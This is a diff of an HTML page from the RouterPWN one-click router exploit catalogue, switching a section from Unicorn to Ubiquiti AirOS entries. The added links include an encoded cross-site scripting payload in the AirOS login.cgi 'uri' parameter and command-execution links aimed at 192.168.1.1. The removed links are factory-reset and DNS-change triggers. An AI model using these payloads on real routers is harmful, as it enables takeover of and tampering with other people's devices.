@@ -2,7 +2,7 @@
 <html>
  <head>
   <title>
-   RouterPWN - Unicorn - One click exploits, News, Vulnerabilities, POC, Alerts
+   RouterPWN - Ubiquiti - One click exploits, News, Vulnerabilities, POC, Alerts
   </title>
   <link href="includes/images/favicon.png" rel="apple-touch-icon"/>
   <link href="includes/images/favicon.ico" rel="shortcut icon"/>
@@ -76,9 +76,9 @@
     </tr>
     <tr>
      <td>
-      <section id="unicorn">
+      <section id="ubiquiti">
        <h1>
-        Unicorn
+        Ubiquiti
        </h1>
        <table cellspacing="0" class="display" id="tabla" width="100%">
         <thead>
@@ -122,21 +122,21 @@
         <tbody>
          <tr>
           <td>
-           10/29/13
+           01/06/13
           </td>
           <td>
            One click
           </td>
           <td>
-           <a href="http://www.securityfocus.com/archive/1/529529/30/0/threaded">
-            www.securityfocus.com
+           <a href="javascript:alert('moloch')">
+            [+]
            </a>
           </td>
           <td>
-           <a href="javascript:wb3300nr_factoryreset()">
-            Unicorn Router WB-3300NR - Factory Reset
+           <a href="javascript:urlxss('http://192.168.1.1/login.cgi?uri=URLXSS')">
+            AirOS login page cross site scripting
            </a>
-           <a href="javascript:wb3300nr_factoryreset(ip)" onclick="return ip=prompt('IP:');">
+           <a href="javascript:setip('/login.cgi?uri=a%22%3E%3Cscript%3Ealert(%22xss%22)%3C%2Fscript%3E%3Ch2%2520%22')">
             [SET IP]
            </a>
           </td>
@@ -146,21 +146,45 @@
          </tr>
          <tr>
           <td>
-           10/29/13
+           12/19/11
           </td>
           <td>
            One click
           </td>
           <td>
-           <a href="http://www.securityfocus.com/archive/1/529529/30/0/threaded">
+           <a href="http://forum.ubnt.com/showthread.php?t=45169">
+            forum.ubnt.com
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.1.1/admin.cgi/sd.css">
+            AirOS v3.6.1 v4.0 v5.x command execution
+           </a>
+           <a href="javascript:setip('/admin.cgi/sd.css')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           06/30/10
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.securityfocus.com/bid/41272/info">
             www.securityfocus.com
            </a>
           </td>
           <td>
-           <a href="javascript:wb3300nr_changedns()">
-            Unicorn Router WB-3300NR - Change DNS
+           <a href="javascript:airoscmd()">
+            AirOS command execution
            </a>
-           <a href="javascript:wb3300nr_changedns(ip)" onclick="return ip=prompt('IP:');">
+           <a href="javascript:airoscmdr()">
             [SET IP]
            </a>
           </td>
